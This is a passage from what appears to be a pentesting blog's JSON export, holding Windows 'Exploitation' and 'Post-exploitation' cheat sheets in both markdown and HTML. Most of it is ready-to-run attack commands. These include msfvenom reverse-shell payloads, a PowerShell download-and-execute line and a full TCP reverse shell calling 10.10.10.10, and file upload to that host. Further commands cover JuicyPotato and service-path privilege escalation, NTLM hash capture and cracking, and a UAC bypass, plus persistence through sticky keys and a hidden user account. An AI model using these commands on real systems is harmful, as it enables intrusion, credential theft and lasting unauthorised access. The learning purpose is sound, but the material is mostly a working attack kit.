\\users\\Destitute\\appdata\\local\\Temp\\rev.bat -l 9001 -c {5B3E6773-3A99-4A3D-8096-7765DD11785C}\n```\n\n<br>\n\n### Unquoted Service Path\n```powershell Check for unquoted service paths\nwmic service get name,pathname, startname | findstr /i \"c:\\program files\"\n```\n```batch Exploit unquoted service path\nsc config \"ServiceName\" binPath= \"C:\\path\\to\\payload.exe\"\n```\n\n<br>\n\n### Capture NTLMv2 hashes via Responder\nRequest a file in an SMB share from a database usnig `xp_dirtree`\n```bash Start responder\nresponder -I tun0\n```\n```bash Request a file from a non-existing SMB share\nmssqlclient.py $user:'$pass'@$IP -windows-auth\n\nSQL> xp_dirtree '\\\\10.10.10.10\\nonexistent';\n```\n\nCrack the hash - view format [here](https://hashcat.net/wiki/doku.php?id=example_hashes)\n```bash NetNTLMv2\n# admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030\n\nhashcat -m 5600 hashes /usr/share/wordlists/rockyou.txt -o hash.cracked --force\n```\n```bash Kerberos 5, etype 23, AS-REP\n#  $krb5asrep$23$user@domain.com:3e156ada591263b8aab0965f5aebd837$007497cb51b6c8116d6407a782ea0e1c5402b17db7afa6b05a6d30ed164a9933c754d720e279c6c573679bd27128fe77e5fea1f72334c1193c8ff0b370fadc6368bf2d49bbfdba4c5dccab95e8c8ebfdc75f438a0797dbfb2f8a1a5f4c423f9bfc1fea483342a11bd56a216f4d5158ccc4b224b52894fadfba3957dfe4b6b8f5f9f9fe422811a314768673e0c924340b8ccb84775ce9defaa3baa0910b676ad0036d13032b0dd94e3b13903cc738a7b6d00b0b3c210d1f972a6c7cae9bd3c959acf7565be528fc179118f28c679f6deeee1456f0781eb8154e18e49cb27b64bf74cd7112a0ebae2102ac \n\nhashcat -m 18200 hashes /usr/share/wordlists/rockyou.txt -o hash.cracked --force\n```\n\n<br>\n\n### Metasploit - bypass UAC\n```bash\nmsfconsole -x 'use exploit/windows/local/bypass_uac; set session 1; run'\n```\n\n<br>\n\n---\n---","source":"_posts/Pentesting/Windows/4.md","raw":"---\ntitle: 4. Exploitation - Windows\ncategories:\n  - Pentesting\n  - Windows\ntags:\n  - Pentesting\n  - Windows\n  - Exploitation\ntoc: true\n---\n\n---\nStep 4 in a penetration test: Exploitation.\nExploit the vulnerabilities found to gain access to the target machine.\n\n---\n<!-- more -->\n\n<br>\n\n## Payloads\n\n### Metasploit\n```bash\nmsfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f py -a x86 --platform windows -b \"\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40\" -v shellcode \n```\n```bash\nmsfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o rev_10.10.10.10_443.exe\n`\n\n<br>\n\n## Exploit Scripts\n\n### PowerShell\n```powershell\nIEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1')\n```\n\n### Script Execution\n```batch\nc:\\path\\to\\payload.exe\n```\n\n<br>\n\n## Servers\n\n### SMB Server\n```bash\nsmbserver.py $share /path/ -smb2support -username user -password pass -port 1445 -configfile smbserver.conf\n```\n```batch\n\\\\10.10.10.10\\share\\whoami.exe\nnet use Z: \\\\10.10.10.10\\share /user:'username' 'password'\n```\n\n### HTTP Server\n```bash\npython -m http.server 8080\n```\n```batch\npowershell -Command \"Invoke-WebRequest -Uri http://10.10.10.10:8080/payload.exe -OutFile C:\\path\\to\\payload.exe\"\n```\n\n<br>\n\n## File Transfer\n\n\n```batch Download files\npowershell -Command \"Invoke-WebRequest -Uri http://10.10.10.10/file.exe -OutFile C:\\path\\to\\file.exe\"\n```\n```batch Upload files\npowershell -Command \"Invoke-WebRequest -Uri http://10.10.10.10/upload -Method Post -InFile C:\\path\\to\\file.exe\"\n```\n\n<br>\n\n## Exploitation Tools\n\n### Windows Reverse Shell (PowerShell)\n```powershell\n$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);\n$stream = $client.GetStream();\n[byte[]]$buffer = 0..65535|%{0};\nwhile(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){\n  $data = (New-Object -TypeName PSObject -Property @{Data = $buffer[0..($i-1)]}).Data;\n  $response = Invoke-Expression -Command ([Text.Encoding]::ASCII.GetString($data));\n  $response = [Text.Encoding]::ASCII.GetBytes($response + 'Prompt>');\n  $stream.Write($response, 0, $response.Length);\n}\n```\n\n<br>\n\n## Privilege Escalation\n\n### Check Privileges\n```batch\nwhoami /priv      REM Check SeImpersoantePrivilege - Juicy Potato\n```\n\n<br>\n\n### `JuicyPotato.exe` privesc from service acc to System\nUse a CLSID from the list provided by JP [here](https://github.com/ohpe/juicy-potato/tree/master/CLSID)\n```batch\njp.exe -t * -p \\users\\Destitute\\appdata\\local\\Temp\\rev.bat -l 9001 -c {5B3E6773-3A99-4A3D-8096-7765DD11785C}\n```\n\n<br>\n\n### Unquoted Service Path\n```powershell Check for unquoted service paths\nwmic service get name,pathname, startname | findstr /i \"c:\\program files\"\n```\n```batch Exploit unquoted service path\nsc config \"ServiceName\" binPath= \"C:\\path\\to\\payload.exe\"\n```\n\n<br>\n\n### Capture NTLMv2 hashes via Responder\nRequest a file in an SMB share from a database usnig `xp_dirtree`\n```bash Start responder\nresponder -I tun0\n```\n```bash Request a file from a non-existing SMB share\nmssqlclient.py $user:'$pass'@$IP -windows-auth\n\nSQL> xp_dirtree '\\\\10.10.10.10\\nonexistent';\n```\n\nCrack the hash - view format [here](https://hashcat.net/wiki/doku.php?id=example_hashes)\n```bash NetNTLMv2\n# admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030\n\nhashcat -m 5600 hashes /usr/share/wordlists/rockyou.txt -o hash.cracked --force\n```\n```bash Kerberos 5, etype 23, AS-REP\n#  $krb5asrep$23$user@domain.com:3e156ada591263b8aab0965f5aebd837$007497cb51b6c8116d6407a782ea0e1c5402b17db7afa6b05a6d30ed164a9933c754d720e279c6c573679bd27128fe77e5fea1f72334c1193c8ff0b370fadc6368bf2d49bbfdba4c5dccab95e8c8ebfdc75f438a0797dbfb2f8a1a5f4c423f9bfc1fea483342a11bd56a216f4d5158ccc4b224b52894fadfba3957dfe4b6b8f5f9f9fe422811a314768673e0c924340b8ccb84775ce9defaa3baa0910b676ad0036d13032b0dd94e3b13903cc738a7b6d00b0b3c210d1f972a6c7cae9bd3c959acf7565be528fc179118f28c679f6deeee1456f0781eb8154e18e49cb27b64bf74cd7112a0ebae2102ac \n\nhashcat -m 18200 hashes /usr/share/wordlists/rockyou.txt -o hash.cracked --force\n```\n\n<br>\n\n### Metasploit - bypass UAC\n```bash\nmsfconsole -x 'use exploit/windows/local/bypass_uac; set session 1; run'\n```\n\n<br>\n\n---\n---","slug":"Pentesting/Windows/4","published":1,"date":"2024-09-23T06:18:55.871Z","updated":"2024-09-23T06:18:55.871Z","comments":1,"layout":"post","photos":[],"_id":"cm1emkmi0001a6gvgehxjffz5","content":"<hr>\n<p>Step 4 in a penetration test: Exploitation.<br>Exploit the vulnerabilities found to gain access to the target machine.</p>\n<hr>\n<span id=\"more\"></span>\n\n<br>\n\n<h2 id=\"Payloads\"><a href=\"#Payloads\" class=\"headerlink\" title=\"Payloads\"></a>Payloads</h2><h3 id=\"Metasploit\"><a href=\"#Metasploit\" class=\"headerlink\" title=\"Metasploit\"></a>Metasploit</h3><pre><code class=\"highlight bash\">msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f py -a x86 --platform windows -b <span class=\"string\">&quot;\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40&quot;</span> -v shellcode</code></pre>\n<pre><code class=\"highlight bash\">msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o rev_10.10.10.10_443.exe\n`\n\n&lt;br&gt;\n\n<span class=\"comment\">## Exploit Scripts</span>\n\n<span class=\"comment\">### PowerShell</span>\n```powershell\nIEX (New-Object Net.WebClient).DownloadString(<span class=\"string\">&#x27;http://10.10.10.10/Invoke-PowerShellTcp.ps1&#x27;</span>)</code></pre>\n\n<h3 id=\"Script-Execution\"><a href=\"#Script-Execution\" class=\"headerlink\" title=\"Script Execution\"></a>Script Execution</h3><pre><code class=\"highlight batch\">c:\\path\\to\\payload.exe</code></pre>\n\n<br>\n\n<h2 id=\"Servers\"><a href=\"#Servers\" class=\"headerlink\" title=\"Servers\"></a>Servers</h2><h3 id=\"SMB-Server\"><a href=\"#SMB-Server\" class=\"headerlink\" title=\"SMB Server\"></a>SMB Server</h3><pre><code class=\"highlight bash\">smbserver.py <span class=\"variable\">$share</span> /path/ -smb2support -username user -password pass -port 1445 -configfile smbserver.conf</code></pre>\n<pre><code class=\"highlight batch\">\\\\10.10.10.10\\share\\whoami.exe\nnet use Z: \\\\10.10.10.10\\share /user:&#x27;username&#x27; &#x27;password&#x27;</code></pre>\n\n<h3 id=\"HTTP-Server\"><a href=\"#HTTP-Server\" class=\"headerlink\" title=\"HTTP Server\"></a>HTTP Server</h3><pre><code class=\"highlight bash\">python -m http.server 8080</code></pre>\n<pre><code class=\"highlight batch\">powershell -Command &quot;Invoke-WebRequest -Uri http://10.10.10.10:8080/payload.exe -OutFile C:\\path\\to\\payload.exe&quot;</code></pre>\n\n<br>\n\n<h2 id=\"File-Transfer\"><a href=\"#File-Transfer\" class=\"headerlink\" title=\"File Transfer\"></a>File Transfer</h2><pre><div class=\"caption\"><span>Download files</span></div><code class=\"highlight batch\">powershell -Command &quot;Invoke-WebRequest -Uri http://10.10.10.10/file.exe -OutFile C:\\path\\to\\file.exe&quot;</code></pre>\n<pre><div class=\"caption\"><span>Upload files</span></div><code class=\"highlight batch\">powershell -Command &quot;Invoke-WebRequest -Uri http://10.10.10.10/upload -Method Post -InFile C:\\path\\to\\file.exe&quot;</code></pre>\n\n<br>\n\n<h2 id=\"Exploitation-Tools\"><a href=\"#Exploitation-Tools\" class=\"headerlink\" title=\"Exploitation Tools\"></a>Exploitation Tools</h2><h3 id=\"Windows-Reverse-Shell-PowerShell\"><a href=\"#Windows-Reverse-Shell-PowerShell\" class=\"headerlink\" title=\"Windows Reverse Shell (PowerShell)\"></a>Windows Reverse Shell (PowerShell)</h3><pre><code class=\"highlight powershell\"><span class=\"variable\">$client</span> = <span class=\"built_in\">New-Object</span> System.Net.Sockets.TCPClient(<span class=\"string\">&#x27;10.10.10.10&#x27;</span>,<span class=\"number\">443</span>);\n<span class=\"variable\">$stream</span> = <span class=\"variable\">$client</span>.GetStream();\n[<span class=\"built_in\">byte</span>[]]<span class=\"variable\">$buffer</span> = <span class=\"number\">0</span>..<span class=\"number\">65535</span>|%&#123;<span class=\"number\">0</span>&#125;;\n<span class=\"keyword\">while</span>((<span class=\"variable\">$i</span> = <span class=\"variable\">$stream</span>.Read(<span class=\"variable\">$buffer</span>, <span class=\"number\">0</span>, <span class=\"variable\">$buffer</span>.Length)) <span class=\"operator\">-ne</span> <span class=\"number\">0</span>)&#123;\n  <span class=\"variable\">$data</span> = (<span class=\"built_in\">New-Object</span> <span class=\"literal\">-TypeName</span> PSObject <span class=\"literal\">-Property</span> <span class=\"selector-tag\">@</span>&#123;<span class=\"keyword\">Data</span> = <span class=\"variable\">$buffer</span>[<span class=\"number\">0</span><span class=\"type\">..</span>(<span class=\"variable\">$i</span>-<span class=\"number\">1</span>)]&#125;).Data;\n  <span class=\"variable\">$response</span> = <span class=\"built_in\">Invoke-Expression</span> <span class=\"literal\">-Command</span> ([<span class=\"type\">Text.Encoding</span>]::ASCII.GetString(<span class=\"variable\">$data</span>));\n  <span class=\"variable\">$response</span> = [<span class=\"type\">Text.Encoding</span>]::ASCII.GetBytes(<span class=\"variable\">$response</span> + <span class=\"string\">&#x27;Prompt&gt;&#x27;</span>);\n  <span class=\"variable\">$stream</span>.Write(<span class=\"variable\">$response</span>, <span class=\"number\">0</span>, <span class=\"variable\">$response</span>.Length);\n&#125;</code></pre>\n\n<br>\n\n<h2 id=\"Privilege-Escalation\"><a href=\"#Privilege-Escalation\" class=\"headerlink\" title=\"Privilege Escalation\"></a>Privilege Escalation</h2><h3 id=\"Check-Privileges\"><a href=\"#Check-Privileges\" class=\"headerlink\" title=\"Check Privileges\"></a>Check Privileges</h3><pre><code class=\"highlight batch\">whoami /priv      REM Check SeImpersoantePrivilege - Juicy Potato</code></pre>\n\n<br>\n\n<h3 id=\"JuicyPotato-exe-privesc-from-service-acc-to-System\"><a href=\"#JuicyPotato-exe-privesc-from-service-acc-to-System\" class=\"headerlink\" title=\"JuicyPotato.exe privesc from service acc to System\"></a><code>JuicyPotato.exe</code> privesc from service acc to System</h3><p>Use a CLSID from the list provided by JP <a href=\"https://github.com/ohpe/juicy-potato/tree/master/CLSID\">here</a></p>\n<pre><code class=\"highlight batch\">jp.exe -t * -p \\users\\Destitute\\appdata\\local\\Temp\\rev.bat -l 9001 -c &#123;5B3E6773-3A99-4A3D-8096-7765DD11785C&#125;</code></pre>\n\n<br>\n\n<h3 id=\"Unquoted-Service-Path\"><a href=\"#Unquoted-Service-Path\" class=\"headerlink\" title=\"Unquoted Service Path\"></a>Unquoted Service Path</h3><pre><div class=\"caption\"><span>Check for unquoted service paths</span></div><code class=\"highlight powershell\">wmic service get name,pathname, startname | findstr /i <span class=\"string\">&quot;c:\\program files&quot;</span></code></pre>\n<pre><div class=\"caption\"><span>Exploit unquoted service path</span></div><code class=\"highlight batch\">sc config &quot;ServiceName&quot; binPath= &quot;C:\\path\\to\\payload.exe&quot;</code></pre>\n\n<br>\n\n<h3 id=\"Capture-NTLMv2-hashes-via-Responder\"><a href=\"#Capture-NTLMv2-hashes-via-Responder\" class=\"headerlink\" title=\"Capture NTLMv2 hashes via Responder\"></a>Capture NTLMv2 hashes via Responder</h3><p>Request a file in an SMB share from a database usnig <code>xp_dirtree</code></p>\n<pre><div class=\"caption\"><span>Start responder</span></div><code class=\"highlight bash\">responder -I tun0</code></pre>\n<pre><div class=\"caption\"><span>Request a file from a non-existing SMB share</span></div><code class=\"highlight bash\">mssqlclient.py <span class=\"variable\">$user</span>:<span class=\"string\">&#x27;$pass&#x27;</span>@<span class=\"variable\">$IP</span> -windows-auth\n\nSQL&gt; xp_dirtree <span class=\"string\">&#x27;\\\\10.10.10.10\\nonexistent&#x27;</span>;</code></pre>\n\n<p>Crack the hash - view format <a href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\">here</a></p>\n<pre><div class=\"caption\"><span>NetNTLMv2</span></div><code class=\"highlight bash\"><span class=\"comment\"># admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030</span>\n\nhashcat -m 5600 hashes /usr/share/wordlists/rockyou.txt -o hash.cracked --force</code></pre>\n<pre><div class=\"caption\"><span>Kerberos 5, etype 23, AS-REP</span></div><code class=\"highlight bash\"><span class=\"comment\">#  $krb5asrep$23$user@domain.com:3e156ada591263b8aab0965f5aebd837$007497cb51b6c8116d6407a782ea0e1c5402b17db7afa6b05a6d30ed164a9933c754d720e279c6c573679bd27128fe77e5fea1f72334c1193c8ff0b370fadc6368bf2d49bbfdba4c5dccab95e8c8ebfdc75f438a0797dbfb2f8a1a5f4c423f9bfc1fea483342a11bd56a216f4d5158ccc4b224b52894fadfba3957dfe4b6b8f5f9f9fe422811a314768673e0c924340b8ccb84775ce9defaa3baa0910b676ad0036d13032b0dd94e3b13903cc738a7b6d00b0b3c210d1f972a6c7cae9bd3c959acf7565be528fc179118f28c679f6deeee1456f0781eb8154e18e49cb27b64bf74cd7112a0ebae2102ac </span>\n\nhashcat -m 18200 hashes /usr/share/wordlists/rockyou.txt -o hash.cracked --force</code></pre>\n\n<br>\n\n<h3 id=\"Metasploit-bypass-UAC\"><a href=\"#Metasploit-bypass-UAC\" class=\"headerlink\" title=\"Metasploit - bypass UAC\"></a>Metasploit - bypass UAC</h3><pre><code class=\"highlight bash\">msfconsole -x <span class=\"string\">&#x27;use exploit/windows/local/bypass_uac; set session 1; run&#x27;</span></code></pre>\n\n<br>\n\n<hr>\n<hr>\n","excerpt":"<hr>\n<p>Step 4 in a penetration test: Exploitation.<br>Exploit the vulnerabilities found to gain access to the target machine.</p>\n<hr>","more":"<br>\n\n<h2 id=\"Payloads\"><a href=\"#Payloads\" class=\"headerlink\" title=\"Payloads\"></a>Payloads</h2><h3 id=\"Metasploit\"><a href=\"#Metasploit\" class=\"headerlink\" title=\"Metasploit\"></a>Metasploit</h3><pre><code class=\"highlight bash\">msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f py -a x86 --platform windows -b <span class=\"string\">&quot;\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40&quot;</span> -v shellcode</code></pre>\n<pre><code class=\"highlight bash\">msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o rev_10.10.10.10_443.exe\n`\n\n&lt;br&gt;\n\n<span class=\"comment\">## Exploit Scripts</span>\n\n<span class=\"comment\">### PowerShell</span>\n```powershell\nIEX (New-Object Net.WebClient).DownloadString(<span class=\"string\">&#x27;http://10.10.10.10/Invoke-PowerShellTcp.ps1&#x27;</span>)</code></pre>\n\n<h3 id=\"Script-Execution\"><a href=\"#Script-Execution\" class=\"headerlink\" title=\"Script Execution\"></a>Script Execution</h3><pre><code class=\"highlight batch\">c:\\path\\to\\payload.exe</code></pre>\n\n<br>\n\n<h2 id=\"Servers\"><a href=\"#Servers\" class=\"headerlink\" title=\"Servers\"></a>Servers</h2><h3 id=\"SMB-Server\"><a href=\"#SMB-Server\" class=\"headerlink\" title=\"SMB Server\"></a>SMB Server</h3><pre><code class=\"highlight bash\">smbserver.py <span class=\"variable\">$share</span> /path/ -smb2support -username user -password pass -port 1445 -configfile smbserver.conf</code></pre>\n<pre><code class=\"highlight batch\">\\\\10.10.10.10\\share\\whoami.exe\nnet use Z: \\\\10.10.10.10\\share /user:&#x27;username&#x27; &#x27;password&#x27;</code></pre>\n\n<h3 id=\"HTTP-Server\"><a href=\"#HTTP-Server\" class=\"headerlink\" title=\"HTTP Server\"></a>HTTP Server</h3><pre><code class=\"highlight bash\">python -m http.server 8080</code></pre>\n<pre><code class=\"highlight batch\">powershell -Command &quot;Invoke-WebRequest -Uri http://10.10.10.10:8080/payload.exe -OutFile C:\\path\\to\\payload.exe&quot;</code></pre>\n\n<br>\n\n<h2 id=\"File-Transfer\"><a href=\"#File-Transfer\" class=\"headerlink\" title=\"File Transfer\"></a>File Transfer</h2><pre><div class=\"caption\"><span>Download files</span></div><code class=\"highlight batch\">powershell -Command &quot;Invoke-WebRequest -Uri http://10.10.10.10/file.exe -OutFile C:\\path\\to\\file.exe&quot;</code></pre>\n<pre><div class=\"caption\"><span>Upload files</span></div><code class=\"highlight batch\">powershell -Command &quot;Invoke-WebRequest -Uri http://10.10.10.10/upload -Method Post -InFile C:\\path\\to\\file.exe&quot;</code></pre>\n\n<br>\n\n<h2 id=\"Exploitation-Tools\"><a href=\"#Exploitation-Tools\" class=\"headerlink\" title=\"Exploitation Tools\"></a>Exploitation Tools</h2><h3 id=\"Windows-Reverse-Shell-PowerShell\"><a href=\"#Windows-Reverse-Shell-PowerShell\" class=\"headerlink\" title=\"Windows Reverse Shell (PowerShell)\"></a>Windows Reverse Shell (PowerShell)</h3><pre><code class=\"highlight powershell\"><span class=\"variable\">$client</span> = <span class=\"built_in\">New-Object</span> System.Net.Sockets.TCPClient(<span class=\"string\">&#x27;10.10.10.10&#x27;</span>,<span class=\"number\">443</span>);\n<span class=\"variable\">$stream</span> = <span class=\"variable\">$client</span>.GetStream();\n[<span class=\"built_in\">byte</span>[]]<span class=\"variable\">$buffer</span> = <span class=\"number\">0</span>..<span class=\"number\">65535</span>|%&#123;<span class=\"number\">0</span>&#125;;\n<span class=\"keyword\">while</span>((<span class=\"variable\">$i</span> = <span class=\"variable\">$stream</span>.Read(<span class=\"variable\">$buffer</span>, <span class=\"number\">0</span>, <span class=\"variable\">$buffer</span>.Length)) <span class=\"operator\">-ne</span> <span class=\"number\">0</span>)&#123;\n  <span class=\"variable\">$data</span> = (<span class=\"built_in\">New-Object</span> <span class=\"literal\">-TypeName</span> PSObject <span class=\"literal\">-Property</span> <span class=\"selector-tag\">@</span>&#123;<span class=\"keyword\">Data</span> = <span class=\"variable\">$buffer</span>[<span class=\"number\">0</span><span class=\"type\">..</span>(<span class=\"variable\">$i</span>-<span class=\"number\">1</span>)]&#125;).Data;\n  <span class=\"variable\">$response</span> = <span class=\"built_in\">Invoke-Expression</span> <span class=\"literal\">-Command</span> ([<span class=\"type\">Text.Encoding</span>]::ASCII.GetString(<span class=\"variable\">$data</span>));\n  <span class=\"variable\">$response</span> = [<span class=\"type\">Text.Encoding</span>]::ASCII.GetBytes(<span class=\"variable\">$response</span> + <span class=\"string\">&#x27;Prompt&gt;&#x27;</span>);\n  <span class=\"variable\">$stream</span>.Write(<span class=\"variable\">$response</span>, <span class=\"number\">0</span>, <span class=\"variable\">$response</span>.Length);\n&#125;</code></pre>\n\n<br>\n\n<h2 id=\"Privilege-Escalation\"><a href=\"#Privilege-Escalation\" class=\"headerlink\" title=\"Privilege Escalation\"></a>Privilege Escalation</h2><h3 id=\"Check-Privileges\"><a href=\"#Check-Privileges\" class=\"headerlink\" title=\"Check Privileges\"></a>Check Privileges</h3><pre><code class=\"highlight batch\">whoami /priv      REM Check SeImpersoantePrivilege - Juicy Potato</code></pre>\n\n<br>\n\n<h3 id=\"JuicyPotato-exe-privesc-from-service-acc-to-System\"><a href=\"#JuicyPotato-exe-privesc-from-service-acc-to-System\" class=\"headerlink\" title=\"JuicyPotato.exe privesc from service acc to System\"></a><code>JuicyPotato.exe</code> privesc from service acc to System</h3><p>Use a CLSID from the list provided by JP <a href=\"https://github.com/ohpe/juicy-potato/tree/master/CLSID\">here</a></p>\n<pre><code class=\"highlight batch\">jp.exe -t * -p \\users\\Destitute\\appdata\\local\\Temp\\rev.bat -l 9001 -c &#123;5B3E6773-3A99-4A3D-8096-7765DD11785C&#125;</code></pre>\n\n<br>\n\n<h3 id=\"Unquoted-Service-Path\"><a href=\"#Unquoted-Service-Path\" class=\"headerlink\" title=\"Unquoted Service Path\"></a>Unquoted Service Path</h3><pre><div class=\"caption\"><span>Check for unquoted service paths</span></div><code class=\"highlight powershell\">wmic service get name,pathname, startname | findstr /i <span class=\"string\">&quot;c:\\program files&quot;</span></code></pre>\n<pre><div class=\"caption\"><span>Exploit unquoted service path</span></div><code class=\"highlight batch\">sc config &quot;ServiceName&quot; binPath= &quot;C:\\path\\to\\payload.exe&quot;</code></pre>\n\n<br>\n\n<h3 id=\"Capture-NTLMv2-hashes-via-Responder\"><a href=\"#Capture-NTLMv2-hashes-via-Responder\" class=\"headerlink\" title=\"Capture NTLMv2 hashes via Responder\"></a>Capture NTLMv2 hashes via Responder</h3><p>Request a file in an SMB share from a database usnig <code>xp_dirtree</code></p>\n<pre><div class=\"caption\"><span>Start responder</span></div><code class=\"highlight bash\">responder -I tun0</code></pre>\n<pre><div class=\"caption\"><span>Request a file from a non-existing SMB share</span></div><code class=\"highlight bash\">mssqlclient.py <span class=\"variable\">$user</span>:<span class=\"string\">&#x27;$pass&#x27;</span>@<span class=\"variable\">$IP</span> -windows-auth\n\nSQL&gt; xp_dirtree <span class=\"string\">&#x27;\\\\10.10.10.10\\nonexistent&#x27;</span>;</code></pre>\n\n<p>Crack the hash - view format <a href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\">here</a></p>\n<pre><div class=\"caption\"><span>NetNTLMv2</span></div><code class=\"highlight bash\"><span class=\"comment\"># admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030</span>\n\nhashcat -m 5600 hashes /usr/share/wordlists/rockyou.txt -o hash.cracked --force</code></pre>\n<pre><div class=\"caption\"><span>Kerberos 5, etype 23, AS-REP</span></div><code class=\"highlight bash\"><span class=\"comment\">#  $krb5asrep$23$user@domain.com:3e156ada591263b8aab0965f5aebd837$007497cb51b6c8116d6407a782ea0e1c5402b17db7afa6b05a6d30ed164a9933c754d720e279c6c573679bd27128fe77e5fea1f72334c1193c8ff0b370fadc6368bf2d49bbfdba4c5dccab95e8c8ebfdc75f438a0797dbfb2f8a1a5f4c423f9bfc1fea483342a11bd56a216f4d5158ccc4b224b52894fadfba3957dfe4b6b8f5f9f9fe422811a314768673e0c924340b8ccb84775ce9defaa3baa0910b676ad0036d13032b0dd94e3b13903cc738a7b6d00b0b3c210d1f972a6c7cae9bd3c959acf7565be528fc179118f28c679f6deeee1456f0781eb8154e18e49cb27b64bf74cd7112a0ebae2102ac </span>\n\nhashcat -m 18200 hashes /usr/share/wordlists/rockyou.txt -o hash.cracked --force</code></pre>\n\n<br>\n\n<h3 id=\"Metasploit-bypass-UAC\"><a href=\"#Metasploit-bypass-UAC\" class=\"headerlink\" title=\"Metasploit - bypass UAC\"></a>Metasploit - bypass UAC</h3><pre><code class=\"highlight bash\">msfconsole -x <span class=\"string\">&#x27;use exploit/windows/local/bypass_uac; set session 1; run&#x27;</span></code></pre>\n\n<br>\n\n<hr>\n<hr>"},{"title":"5. Internal enumeration - Windows","toc":true,"_content":"\n---\nStep 5: Internal enumeration.\nFind as much relevant info about the target: networking, services, administration, file system.\n\n---\n<!-- more -->\n\n<br>\n\n\n\n<br>\n\n---\n---","source":"_posts/Pentesting/Windows/5.md","raw":"---\ntitle: 5. Internal enumeration - Windows\ncategories:\n  - Pentesting\n  - Windows\ntags:\n  - Pentesting\n  - Windows\n  - Internal enumeration\ntoc: true\n---\n\n---\nStep 5: Internal enumeration.\nFind as much relevant info about the target: networking, services, administration, file system.\n\n---\n<!-- more -->\n\n<br>\n\n\n\n<br>\n\n---\n---","slug":"Pentesting/Windows/5","published":1,"date":"2024-09-23T06:18:55.872Z","updated":"2024-09-23T06:18:55.872Z","comments":1,"layout":"post","photos":[],"_id":"cm1emkmi1001e6gvg5ej19pj1","content":"<hr>\n<p>Step 5: Internal enumeration.<br>Find as much relevant info about the target: networking, services, administration, file system.</p>\n<hr>\n<span id=\"more\"></span>\n\n<br>\n\n\n\n<br>\n\n<hr>\n<hr>\n","excerpt":"<hr>\n<p>Step 5: Internal enumeration.<br>Find as much relevant info about the target: networking, services, administration, file system.</p>\n<hr>","more":"<br>\n\n\n\n<br>\n\n<hr>\n<hr>"},{"title":"6. Post-exploitation - Windows","toc":true,"_content":"\n---\nStep 6: Post exploitation.\nInstall backdoors, extract credentials and relevant data, clean step foots. \n\n---\n<!-- more -->\n\n<br>\n\n\n## Persistence\n\n### RDP\n```batch Allow RDP through Registry (as administrator)\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\n```\n```batch Allow RDP through the Windows Firewall (as administrator)\nnetsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes\n```\n```pwsh Allow RDP through Powershell (as administrator)\nSet-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server\" -Name \"fDenyTSConnections\" -Value 0\n```\n<br>\n```bash Metasploit - show GUI\nrun getgui -e -u 'user' -p 'password'\n```\n<br>\n```bash Metasploit - sticky keys\nuse post/windows/manage/sticky_keys\nset session 1\nexploit\n```\n\n<br>\n\n```batch Create a hidden user\nnet user hiddenuser \"password\" /add\nreg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v hiddenuser /t REG_DWORD /d 0 /f\n```\n\n<br>\n\n---\n---","source":"_posts/Pentesting/Windows/6.md","raw":"---\ntitle: 6. Post-exploitation - Windows\ncategories:\n  - Pentesting\n  - Windows\ntags:\n  - Pentesting\n  - Windows\n  - Post-exploitation\ntoc: true\n---\n\n---\nStep 6: Post exploitation.\nInstall backdoors, extract credentials and relevant data, clean step foots. \n\n---\n<!-- more -->\n\n<br>\n\n\n## Persistence\n\n### RDP\n```batch Allow RDP through Registry (as administrator)\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\n```\n```batch Allow RDP through the Windows Firewall (as administrator)\nnetsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes\n```\n```pwsh Allow RDP through Powershell (as administrator)\nSet-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server\" -Name \"fDenyTSConnections\" -Value 0\n```\n<br>\n```bash Metasploit - show GUI\nrun getgui -e -u 'user' -p 'password'\n```\n<br>\n```bash Metasploit - sticky keys\nuse post/windows/manage/sticky_keys\nset session 1\nexploit\n```\n\n<br>\n\n```batch Create a hidden user\nnet user hiddenuser \"password\" /add\nreg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v hiddenuser /t REG_DWORD /d 0 